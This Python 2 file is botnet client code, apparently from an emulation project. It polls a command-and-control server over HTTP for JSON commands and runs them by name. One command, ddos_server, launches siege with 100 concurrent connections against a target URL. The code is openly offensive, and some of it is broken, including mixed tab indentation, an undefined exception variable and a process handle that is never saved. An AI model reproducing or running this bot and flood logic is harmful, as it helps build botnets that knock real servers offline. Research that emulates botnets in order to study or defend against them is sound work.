#!/usr/bin/env python2
# coding=UTF-8
"""The BotCommands module contains a number of methods each of which may be used as a command and can be executed by bots."""
import logging, subprocess, shlex, json
import requests
import validators
from resources import emu_config

class BotCommands(object):
    """This class collects all methods that can be used as commands for a bot.
    To introduce a new command, simply add it to this class.
    It is also possible to add new methods during runtime."""
    ddos_process = None


    def joinParams(self, hallo, hello):
        """Echos its parameters back"""
        return hallo + " " + hello

    def default_command(self, **kwargs):
        """Echos its parameters back"""
        logging.info("default_command: %s" % kwargs)

    def ddos_server(self, url=None, ip=None, timeout=30):
        if self.ddos_process is None or not self.ddos_process.poll():
            if self.ddos_process is not None:
                logging.debug("siege: %s" % self.ddos_process.communicate())

            if url is not None and validators.url(url):
		cmdstr = "timeout -k %ds siege -c 100 -t %ds %s "%(timeout + 2, timeout, url)
                logging.debug(cmdstr)
                ddos_process = subprocess.Popen(shlex.split(cmdstr))
            elif ip is not None and validators.ipv4(ip) or validators.ipv6(ip):
                # TODO: DDOS eine IP
                pass
            else:
                logging.warning("Neither ip nor url where supplied, DDOS failed")
                logging.debug("isurl: %s, isip: %s"%(validators.url(str(url)), validators.ipv4(str(url)) or validators.ipv6(ip)))
        else:
            logging.debug("siege is still running")

cmdobject = BotCommands()


def fetchCurrentCommand(cnc, oldCmd=None):
    """Fetches a command from something that acts like a CnC-Server and executes it. This way the Botmaster controls the clients.
    The Servent does not need to keep track of their addresses because they pull from it and reverse proxies
    can be used, so that the clients do not need to know the identity of the Servent. """

    response = requests.get("http://%s:%s/current_command"%(cnc, emu_config.PORT),
                            headers={"Accept": "application/json"})

    if response.status_code == 200:
        newCmd = json.loads(response.text)
        if oldCmd is None or newCmd["timestamp"] > oldCmd["timestamp"]:
            logging.debug("Replaced command %s with %s"%(oldCmd, newCmd))
            return newCmd
        else:
            return oldCmd
    else:
        return oldCmd


def executeCurrentCommand(command):
    """Executes a command that has been passed to the bot
    :param command: A dict that contains the command to execute as well as its parameters"""

    assert isinstance(command, dict), "Command is a %s"%type(command)
    assert command.has_key("command") and command["command"] != ""

    methodToCall = getattr(BotCommands, command["command"])
    try:
        retval = methodToCall(cmdobject, **command["kwargs"])
        return retval
    except TypeError:
	logging.warning("Command %s(**%s) could not be executed: %s"%(command["command"], command["kwargs"], ex))

if __name__ == '__main__':
    logging.basicConfig(**emu_config.logging_config)


